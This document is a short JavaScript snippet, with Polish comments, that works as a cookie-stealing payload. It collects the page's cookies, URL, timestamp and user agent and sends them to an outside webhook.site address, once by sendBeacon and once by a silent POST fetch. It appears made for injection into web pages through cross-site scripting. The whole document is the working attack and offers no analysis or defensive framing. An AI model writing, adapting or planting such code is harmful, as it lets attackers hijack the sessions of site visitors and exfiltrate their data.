(function() {
    const webhook = "https://webhook.site/53158f3f-579b-4186-8cdd-d33333543bec";
    
    const data = {
        cookie: document.cookie,
        url: window.location.href,
        time: new Date().toLocaleString(),
        userAgent: navigator.userAgent
    };

    // Wysyłanie przez sendBeacon (szybkie)
    navigator.sendBeacon(webhook, JSON.stringify(data));

    // Dodatkowo przez fetch
    fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    }).catch(() => {});
})();
